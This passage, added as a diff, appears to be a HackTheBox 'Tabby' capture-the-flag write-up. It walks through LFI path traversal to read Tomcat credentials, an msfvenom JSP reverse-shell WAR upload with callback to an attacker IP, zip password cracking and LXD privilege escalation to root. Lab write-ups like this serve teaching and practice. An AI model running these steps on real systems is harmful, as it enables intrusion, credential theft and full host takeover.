+<span class="n">tcpdump</span><span class="ss">:x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">113</span><span class="o">::/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">landscape</span><span class="ss">:x</span><span class="p">:</span><span class="mi">109</span><span class="p">:</span><span class="mi">115</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">landscape</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">pollinate</span><span class="ss">:x</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="mi">1</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
+<span class="n">sshd</span><span class="ss">:x</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="mi">65534</span><span class="o">::/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="ss">:x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="ss">:systemd</span> <span class="no">Core</span> <span class="no">Dumper</span><span class="ss">:/:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lxd</span><span class="ss">:x</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="mi">100</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">lxd</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
+<span class="n">tomcat</span><span class="ss">:x</span><span class="p">:</span><span class="mi">997</span><span class="p">:</span><span class="mi">997</span><span class="o">::/</span><span class="n">opt</span><span class="o">/</span><span class="n">tomcat</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
+<span class="n">mysql</span><span class="ss">:x</span><span class="p">:</span><span class="mi">112</span><span class="p">:</span><span class="mi">120</span><span class="ss">:MySQL</span> <span class="no">Server</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
+<span class="n">ash</span><span class="ss">:x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="ss">:clive:/</span><span class="n">home</span><span class="o">/</span><span class="n">ash</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</code></pre></div></div>
+
+<p>Now visiting the other part of the http webpage <code class="language-plaintext highlighter-rouge">8080</code>, which is a single page running tomcat server.</p>
+
+<p><img src="/assets/img/sample/tabby/tabby3.png" alt="" /></p>
+
+<p>Seeing that page, i felt that <code class="language-plaintext highlighter-rouge">LFI</code> should work on this page too.</p>
+
+<p>If <code class="language-plaintext highlighter-rouge">LFI</code> works in the right way as intended, then the <code class="language-plaintext highlighter-rouge">credentials</code> should be found in <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code>.</p>
+
+<p>After a little bit of research and directory fuzzing I came to see that the correct path is <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/etc/tomcat-users.xml</code></p>
+
+<p>Going to the <code class="language-plaintext highlighter-rouge">source-code</code> of the url: I was able to find the cred of the user.</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml </code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;role <span class="nv">rolename</span><span class="o">=</span><span class="s2">"admin-gui"</span>/&gt;
+   &lt;role <span class="nv">rolename</span><span class="o">=</span><span class="s2">"manager-script"</span>/&gt;
+   &lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">"tomcat"</span> <span class="nv">password</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3cureP4s5w0rd123</span><span class="s2">!"</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">"admin-gui,manager-script"</span>/&gt;
+</code></pre></div></div>
+<h2 id="getting-foothold">Getting Foothold</h2>
+
+<h2 id="time-for-creating-the-backdoor">Time for creating the backdoor.</h2>
+
+<h3 id="there-are-two-ways-of-doing-this-this-is-my-of-doing-it">There are two ways of doing this. This is my of doing it.</h3>
+
+<p>Uploading a payload as <code class="language-plaintext highlighter-rouge">.war</code> file can give us the reverse shell.</p>
+
+<h2 id="crafting-the-payload-with-msfvenom">Crafting the payload with msfvenom.</h2>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.X.X LPORT=5566 -f war &gt; payload.war</code></p>
+</blockquote>
+
+<p>Try to use <code class="language-plaintext highlighter-rouge">LPORT</code> as some thing other than <code class="language-plaintext highlighter-rouge">1234</code> because there are lot of users hacking the same machine!..</p>
+
+<h2 id="time-to-upload-the-payload-now">Time to upload the payload now.</h2>
+
+<p><code class="language-plaintext highlighter-rouge">curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file payload.war "http://10.10.10.194:8080/manager/text/deploy?path=/payload.war"</code></p>
+
+<p>When you see <code class="language-plaintext highlighter-rouge">ok</code> that means the <code class="language-plaintext highlighter-rouge">payload</code> has been uploaded successfully.</p>
+
+<p><img src="/assets/img/sample/tabby/tabby4.png" alt="" /></p>
+
+<p>Now set up listener <code class="language-plaintext highlighter-rouge">nc -lvnp 5566</code> and go to <code class="language-plaintext highlighter-rouge">tabby.htb:8080/payload.war</code> and you should get a <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
+
+<p>use <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash")'</code> for the shell upgrade.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tomcat</span><span class="vi">@tabby</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="err">$</span> <span class="n">ls</span>
+<span class="n">ls</span>
+<span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span>  <span class="n">archive</span>  <span class="n">revoked_certs</span>  <span class="n">statement</span>
+<span class="n">tomcat</span><span class="vi">@tabby</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation-to-user-ash">Privilege escalation to User <code class="language-plaintext highlighter-rouge">ASH</code></h2>
+
+<p>Ennumeration on <code class="language-plaintext highlighter-rouge">/var/www/html</code> there is a folder called <code class="language-plaintext highlighter-rouge">files</code> which contains a <code class="language-plaintext highlighter-rouge">backup.zip</code> file <code class="language-plaintext highlighter-rouge">16162020_backup.zip</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tomcat</span><span class="o">@</span><span class="n">tabby</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<span class="n">total</span> <span class="mi">36</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">ash</span>  <span class="n">ash</span>  <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">17</span> <span class="mi">21</span><span class="p">:</span><span class="mi">59</span> <span class="p">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">17</span> <span class="mi">16</span><span class="p">:</span><span class="mi">24</span> <span class="p">..</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">ash</span>  <span class="n">ash</span>  <span class="mi">8716</span> <span class="n">Jun</span> <span class="mi">16</span> <span class="mi">13</span><span class="p">:</span><span class="mi">42</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nb">zip</span>
+</code></pre></div></div>
+
+<p>So I tried extracting it, but it is <code class="language-plaintext highlighter-rouge">password</code> protected.</p>
+
+<h2 id="cracking-the-password-with-john">Cracking the password with <code class="language-plaintext highlighter-rouge">JOHN</code>.</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">zip2john</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span> <span class="o">&gt;&gt;</span> <span class="n">backup</span><span class="o">-</span><span class="nb">hash</span>
+<span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span> <span class="n">is</span> <span class="n">not</span> <span class="n">encrypted!</span>
+<span class="n">ver</span> <span class="mf">1.0</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span> <span class="n">is</span> <span class="n">not</span> <span class="n">encrypted</span><span class="p">,</span> <span class="n">or</span> <span class="n">stored</span> <span class="n">with</span> <span class="n">non</span><span class="o">-</span><span class="n">handled</span> <span class="n">compression</span> <span class="n">type</span>
+<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">favicon</span><span class="p">.</span><span class="nf">ico</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">338</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">766</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">282</span><span class="no">B6DE2</span>
+<span class="n">ver</span> <span class="mf">1.0</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="o">/</span> <span class="n">is</span> <span class="n">not</span> <span class="n">encrypted</span><span class="p">,</span> <span class="n">or</span> <span class="n">stored</span> <span class="n">with</span> <span class="n">non</span><span class="o">-</span><span class="n">handled</span> <span class="n">compression</span> <span class="n">type</span>
+<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="nf">php</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">3255</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">14793</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">285</span><span class="no">CC4D6</span>
+<span class="n">ver</span> <span class="mf">1.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">logo</span><span class="p">.</span><span class="nf">png</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">2906</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">2894</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">2</span><span class="no">F9F45F</span>
+<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">news</span><span class="p">.</span><span class="nf">php</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">114</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">123</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">5</span><span class="no">C67F19E</span>
+<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="no">Readme</span><span class="p">.</span><span class="nf">txt</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">805</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">1574</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">32</span><span class="no">DB9CE3</span>
+<span class="no">NOTE</span><span class="p">:</span> <span class="no">It</span> <span class="n">is</span> <span class="n">assumed</span> <span class="n">that</span> <span class="n">all</span> <span class="n">files</span> <span class="k">in</span> <span class="n">each</span> <span class="n">archive</span> <span class="n">have</span> <span class="n">the</span> <span class="n">same</span> <span class="n">password</span><span class="o">.</span>
+<span class="no">If</span> <span class="n">that</span> <span class="n">is</span> <span class="n">not</span> <span class="n">the</span> <span class="k">case</span><span class="p">,</span> <span class="n">the</span> <span class="nb">hash</span> <span class="n">may</span> <span class="n">be</span> <span class="n">uncrackable</span><span class="o">.</span> <span class="no">To</span> <span class="n">avoid</span> <span class="n">this</span><span class="p">,</span> <span class="n">use</span>
+<span class="n">option</span> <span class="o">-</span><span class="n">o</span> <span class="n">to</span> <span class="n">pick</span> <span class="n">a</span> <span class="n">file</span> <span class="n">at</span> <span class="n">a</span> <span class="n">time</span><span class="o">.</span>
+</code></pre></div></div>
+
+<p>Trying to crack the hash with the help of <code class="language-plaintext highlighter-rouge">rockyou.txt</code>.</p>
+
+<h3 id="john-backup-hash--wusrsharewordlistsrockyoutxt"><code class="language-plaintext highlighter-rouge">john backup-hash -w=/usr/share/wordlists/rockyou.txt</code></h3>
+
+<p>and the password is <code class="language-plaintext highlighter-rouge">admin@it </code>.</p>
+
+<h2 id="unzipping-the-file-with-the-password-found">Unzipping the file with the password found.</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip 16162020_backup.zip 
+Archive:  16162020_backup.zip
+   creating: var/www/html/assets/
+<span class="o">[</span>16162020_backup.zip] var/www/html/favicon.ico password: 
+  inflating: var/www/html/favicon.ico  
+   creating: var/www/html/files/
+  inflating: var/www/html/index.php  
+ extracting: var/www/html/logo.png   
+  inflating: var/www/html/news.php   
+  inflating: var/www/html/Readme.txt
+</code></pre></div></div>
+<h4 id="bad-luck-that-was-a-rabbit-hole">Bad luck! That was a <code class="language-plaintext highlighter-rouge">Rabbit hole</code>..</h4>
+
+<p>So I used the <code class="language-plaintext highlighter-rouge">password</code> <code class="language-plaintext highlighter-rouge">admin@it</code> with the user <code class="language-plaintext highlighter-rouge">ash</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">su</span> <span class="o">-</span> <span class="n">ash</span>
+<span class="n">Password</span><span class="p">:</span> <span class="n">admin</span><span class="o">@</span><span class="n">it</span>
+<span class="n">ash</span><span class="o">@</span><span class="n">tabby</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">whoami</span>
+<span class="n">whoami</span>
+<span class="n">ash</span>
+</code></pre></div></div>
+<h2 id="getting-usertxt">Getting User.txt</h2>
+
+<p>ash@tabby:~$ cat user.txt
+cat user.txt
+d<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><em>**</em>1</p>
+
+<h2 id="privilege-escalation-to-root">Privilege Escalation to Root.</h2>
+
+<blockquote>
+  <p>Checking the id of <code class="language-plaintext highlighter-rouge">ash</code></p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">ash@tabby:~$ id
+id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</code></p>
+
+<h4 id="we-see-that-ash-is-part-of-lxd-group-so-according-to-article-httpswwwhackingarticlesinlxd-privilege-escalation-i-just-followed-the-steps-and-got-root-">We see that ash is part of lxd group. So according to article <code class="language-plaintext highlighter-rouge">https://www.hackingarticles.in/lxd-privilege-escalation/</code> I just followed the steps and got root .</h4>
+
+<h4 id="as-there-are-many-ways-on-priv-esc-using-lxd-i-took-help-of-hackingarticles-for-it">As there are many ways on priv esc using <code class="language-plaintext highlighter-rouge">LXD</code> I took help of <code class="language-plaintext highlighter-rouge">hackingarticles</code> for it.</h4>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">git</span> <span class="nb">clone</span>  <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">github</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">saghul</span><span class="o">/</span><span class="n">lxd</span><span class="o">-</span><span class="n">alpine</span><span class="o">-</span><span class="n">builder</span><span class="p">.</span><span class="nf">git</span>
+<span class="n">cd</span> <span class="n">lxd</span><span class="o">-</span><span class="n">alpine</span><span class="o">-</span><span class="n">builder</span>
+<span class="p">.</span><span class="nf">/</span><span class="n">build</span><span class="o">-</span><span class="n">alpine</span>
+
+</code></pre></div></div>
+
+<h4 id="you-will-get-a-targz-file-set-up-http-server-and-copy-it-to-the-remote-machine">You will get a <code class="language-plaintext highlighter-rouge">tar.gz</code> file. Set up http server and copy it to the remote machine.</h4>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer 8080</code></p>
+</blockquote>
+
+<h4 id="on-another-hand-we-will-download-the-alpine-image-inside-tmp-directory-on-the-host-machine">On another hand we will download the alpine-image inside <code class="language-plaintext highlighter-rouge">/tmp</code> directory on the host machine.</h4>
+
+<blockquote>
+  <p>cd /tmp
+wget http://10.10.14.17:8080/apline-v3.10-x86_64-20191008_1227.tar.gz</p>
+</blockquote>
+
+<h4 id="after-the-image-is-built-it-can-be-added-as-an-image-to-lxd-as-follows">After the image is built it can be added as an image to LXD as follows:</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz <span class="nt">--alias</span> myimage
+lxc image list
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc init myimage ignite <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
+</span>lxc config device add ignite mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
+</span>lxc start ignite
+lxc <span class="nb">exec </span>ignite /bin/sh
+<span class="nb">id</span>
+</code></pre></div></div>
+
+<p>``` shell	
+cd /mnt/root/root
+cd /mnt/root/root
+/mnt/root/root # cat root.txt
+cat root.txt
+3<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><em>**</em>5</p>
+
+<hr />
+
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
+My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#gobuster" class="page__taxonomy-item p-category" rel="tag">gobuster,</a><span class="sep">, </span>
+    
+      <a href="/tags/#john" class="page__taxonomy-item p-category" rel="tag">john,</a><span class="sep">, </span>
+    
+      <a href="/tags/#lfi" class="page__taxonomy-item p-category" rel="tag">lfi,</a><span class="sep">, </span>
+    
+      <a href="/tags/#linux" class="page__taxonomy-item p-category" rel="tag">linux,</a><span class="sep">, </span>
+    
+      <a href="/tags/#lxd" class="page__taxonomy-item p-category" rel="tag">lxd</a><span class="sep">, </span>
+    
+      <a href="/tags/#tomcat" class="page__taxonomy-item p-category" rel="tag">tomcat,</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#hackthebox" class="page__taxonomy-item p-category" rel="tag">hackthebox</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2020-07-07T00:00:00+05:30">July 7, 2020</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://twitter.com/intent/tweet?text=HackTheBox+Tabby%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FTabby%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FTabby%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/hackthebox/Tabby/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/hackthebox/Blunder/" class="pagination--pager" title="HackTheBox Blunder">Previous</a>
+    
+    
+      <a href="/tryhackme/Haskhell/" class="pagination--pager" title="Tryhackme Haskhell">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/malleablec2.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/Malleable-c2-pro/" rel="permalink">Cobalt Strike Malleable C2 Profiles
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-25T00:00:00+05:30">December 25, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hide from blue team like a pro by using malleable c2 profiles.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/cs.webp" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/redirectors/" rel="permalink">Cobalt Strike Redirectors using Apache-SSL
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-19T00:00:00+05:30">December 19, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/RTIL.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/RED-TEAM-Infra/" rel="permalink">RED-TEAM Home-Lab Infra
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">How to Setup a Red-Teams infrastructure at Home
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/GOAD/goad-part3.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/goad/GOAD-p3/" rel="permalink">Game of Active Directory - Part 3 [Recon]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to pract...</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
